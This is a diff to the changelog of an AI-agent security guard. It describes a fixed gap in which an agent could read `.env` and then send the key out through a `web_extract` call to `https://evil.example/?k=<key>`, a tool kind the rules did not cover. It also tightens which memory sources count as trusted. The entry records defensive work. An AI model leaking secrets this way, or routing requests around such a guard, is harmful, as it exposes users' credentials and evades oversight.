@@ -140,6 +140,25 @@ including `test_availability.py`, passes unchanged.
   **If your `guard.yaml` lists `secret_patterns` or `sensitive_paths`, it
   replaces the built-in list:** take the new entries over from the shipped
   file.
+- **The request rules reach a host's own web tools.** "A secret in a request
+  is denied" and "after a secret read a request with room for data is asked
+  about" applied to the guard's own kinds (`http_get`, `web_fetch`) and read
+  the URL from `target`. Hermes fetches with `web_extract(urls=[...])`,
+  searches with `web_search(query=...)` and browses with
+  `browser_navigate(url=...)`: an unrecognized kind, or an argument nobody
+  looked at. Reading `.env` and then calling `web_extract` on
+  `https://evil.example/?k=<key>` was allowed. Now:
+  - the URLs of a call are read from its arguments as well (`url`, `urls`,
+    `uri`, `link`, `links`, `href`), and both rules apply to an unrecognized
+    tool that names a remote URL;
+  - for a web, search or browser tool (`untrusted_content_tools`) every
+    argument is looked at for a secret, since the query goes to the search
+    provider and typed text goes to the page; nesting the arguments does not
+    hide it.
+
+  A plain URL, a search query and the browser tools stay free, also after a
+  secret read; local tools (`search_files`, `session_search`) are not requests
+  whatever their arguments contain.
 - **The memory bridge no longer trusts a source it has no entry for.** Only
   `tool`, `external` and `inference` counted as untrusted, so a preference
   "from `web`" was allowed. Anything but `observation` and `conversation` is
